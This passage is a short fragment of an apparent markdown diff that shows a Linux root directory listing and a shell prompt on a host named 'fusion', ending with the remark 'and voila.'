+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+media
+mnt
+opt
+proc
+rofs
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+I have no name!@fusion:/$ $
+
+```
+# and voila.
